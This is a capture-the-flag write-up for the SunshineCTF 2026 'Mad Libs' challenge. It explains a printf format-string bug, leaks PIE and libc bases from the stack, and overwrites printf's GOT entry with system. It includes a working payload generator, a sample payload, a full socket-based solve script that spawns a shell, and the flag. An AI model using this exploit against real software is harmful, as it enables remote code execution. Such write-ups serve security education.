@@ -1,0 +1,176 @@
+---
+title: 'SunshineCTF 2026 - Mad Libs'
+description: 'A textbook printf(buf) with eight tries, leaking PIE and libc off the stack then overwriting printf@got with system in a single format call'
+date: 2026-09-30
+tags: ['writeup', 'pwn', 'format-string', 'got-overwrite', 'ret2libc', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+The plainest format-string bug in the set, with one detail that matters: the GOT entry being overwritten belongs to `printf` itself, so it has to be written **in a single call**. Split it across lines and the next `printf` jumps into a half-written pointer.
+
+## Challenge Description
+
+> Fill in the blanks! Our Mad Libs game prints back whatever you type. It's just a simple word game... right?
+
+Provided: `mad_libs`, `libc.so.6`, `ld-linux-x86-64.so.2`.
+
+## Initial Analysis
+
+```text
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+```
+
+Partial RELRO is the important one — the GOT is writable. `main` is a loop of eight:
+
+```asm
+1211:  mov    eax,DWORD PTR [rbp-0x114]
+1217:  add    eax,0x1
+121a:  mov    esi,eax
+121c:  lea    rax,[rip+0xe06]        ; "(%d) > "
+1223:  mov    rdi,rax
+1226:  mov    eax,0x0
+122b:  call   10b0 <printf@plt>      ; printf("(%d) > ", i+1)   -- fine
+1230:  mov    rdx,QWORD PTR [rip+0x2e19]   ; stdin
+1237:  lea    rax,[rbp-0x110]
+123e:  mov    esi,0x100
+1243:  mov    rdi,rax
+1246:  call   10c0 <fgets@plt>       ; fgets(buf, 0x100, stdin)
+124b:  test   rax,rax
+124e:  je     1276
+1250:  lea    rax,[rbp-0x110]
+1257:  mov    rdi,rax
+125a:  mov    eax,0x0
+125f:  call   10b0 <printf@plt>      ; printf(buf)             -- the bug
+1264:  add    DWORD PTR [rbp-0x114],0x1
+126b:  cmp    DWORD PTR [rbp-0x114],0x7
+1272:  jle    1211
+```
+
+The second `printf` takes the buffer directly as its format string. Eight iterations means eight separate format strings, which is more than enough.
+
+## The Vulnerability
+
+First, find where the buffer lands in the argument list:
+
+```text
+$ printf 'AAAAAAAA.%%1$p.%%2$p.%%3$p.%%4$p.%%5$p.%%6$p.%%7$p.%%8$p\n' | ./mad_libs
+(1) > AAAAAAAA.0x5725985ae2a1.0xfbad2088.0x67a51d5f.0x5725985ae2dc.(nil).0x37f.0x3112d005.0x4141414141414141
+```
+
+`%8$p` is `0x4141414141414141`, so the buffer starts at argument 8.
+
+Then sweep further up the stack for something useful:
+
+```text
+(4) > (nil) 0x75a6d02044e0 (nil) 0x7ffda9cd9cf0 0xfbc0171874ce6000 0x7ffda9cd9d70 0x75a6d002a1ca (nil) 0x7ffda9cd9df8 0x1a9cd9d10 0x5bc31adb71c9 0x7ffda9cd9df8
+```
+
+Two entries are worth taking:
+
+- `%43$p` is `0x75a6d002a1ca` — a libc return address. Subtracting `0x2a1ca` leaves `0x75a6d0000000`.
+- `%47$p` is `0x5bc31adb71c9` — its low 12 bits are `0x1c9`, and `main` is at offset `0x11c9`. Subtracting gives the PIE base.
+
+Both come out **page-aligned**, which is the check that the offsets are right. If either had a non-zero low 12 bits, the guess was wrong.
+
+## Exploitation
+
+The target is `printf@got` at `pie + 0x4010`, overwritten with `system` at `libc + 0x58740`.
+
+The constraint is that this has to happen in **one** `printf` call. The loop's next iteration calls `printf("(%d) > ", i+1)` before reading another line, so if only two of the three halves are written, that call dereferences a pointer that is half `system` and half the original — and the process dies before you can send the third.
+
+So all three `%hn` writes go into a single format string, with the three target addresses placed after it, 8-byte aligned:
+
+```python
+def build_write(target, value, maxlen=250):
+    """Three %hn writes in one call; addresses trail the format, 8-aligned."""
+    halves = sorted(((target + 2 * k, (value >> (16 * k)) & 0xffff) for k in range(3)),
+                    key=lambda t: t[1])
+
+    def fmt_for(base):
+        idx0, out, written = BUF_ARG + base // 8, b"", 0
+        for slot, (_addr, want) in enumerate(halves):
+            delta = (want - written) % 0x10000
+            if delta:
+                out += b"%" + str(delta).encode() + b"c"
+            written = want
+            out += b"%" + str(idx0 + slot).encode() + b"$hn"
+        return out
+
+    for base in range(8, 200, 8):
+        fmt = fmt_for(base)
+        if len(fmt) > base:
+            continue
+        payload = fmt.ljust(base, b"_") + b"".join(p64(a) for a, _ in halves)
+        if len(payload) < maxlen and b"\n" not in payload:
+            return payload
+```
+
+The halves are sorted by value so each `%Nc` only ever has to advance the character count forwards. The padding search finds the smallest 8-aligned offset where the format text still fits before the address block starts.
+
+A sample payload:
+
+```text
+%32767c%13$hn%1857c%14$hn%28805c%15$hn__\x14\x80UUUU\x00\x00\x10\x80UUUU\x00\x00\x12\x80UUUU\x00\x00
+```
+
+After that write lands, the loop's own prompt `printf("(%d) > ", i+1)` becomes `system("(%d) > ")` — sh reports a syntax error and carries on — and the next line submitted goes straight to `system(buf)`:
+
+```text
+total 12
+-rw-r----- 1 root mad_libs 27 Sep 26 00:13 flag.txt
+sun{f1ll_iN_th3_g0T_eNtry}
+```
+
+## Solve Script
+
+```python
+import socket, struct, time, re
+p64 = lambda x: struct.pack("<Q", x)
+
+BUF_ARG      = 8          # %8$ is the first qword of the buffer
+PRINTF_GOT   = 0x4010
+MAIN_OFF     = 0x11c9
+LIBC_RET_OFF = 0x2a1ca    # where %43$p points inside libc
+SYSTEM_OFF   = 0x58740    # Ubuntu GLIBC 2.39-0ubuntu8.3
+
+def exploit(host, port, cmds=(b"ls -la; cat flag*\n",)):
+    s = socket.create_connection((host, port), timeout=10); s.settimeout(6)
+    def drain(t=1.5):
+        out, end = b"", time.time() + t
+        while time.time() < end:
+            try: out += s.recv(65536)
+            except socket.timeout: pass
+        return out
+
+    drain(1.0)
+    s.sendall(b"%43$p|%47$p\n")
+    d = drain(1.5)
+    m = re.search(rb"(0x[0-9a-f]+)\|(0x[0-9a-f]+)", d)
+    libc = int(m.group(1), 16) - LIBC_RET_OFF
+    pie  = int(m.group(2), 16) - MAIN_OFF
+    print(f"libc base = {libc:#x}   pie base = {pie:#x}")
+    assert not (libc & 0xfff or pie & 0xfff), "offsets wrong - bases not page aligned"
+
+    # one call, all three halves: a partial GOT write kills the next printf
+    s.sendall(build_write(pie + PRINTF_GOT, libc + SYSTEM_OFF) + b"\n")
+    drain(2.0)
+
+    s.sendall(b"/bin/sh\n"); drain(1.0)
+    out = b""
+    for c in cmds:
+        s.sendall(c); out += drain(1.5)
+    return out
+
+print(exploit("chal.sunshinectf.games", 26001).decode())
+```
+
+## Flag
+
+```text
+sun{f1ll_iN_th3_g0T_eNtry}
+```
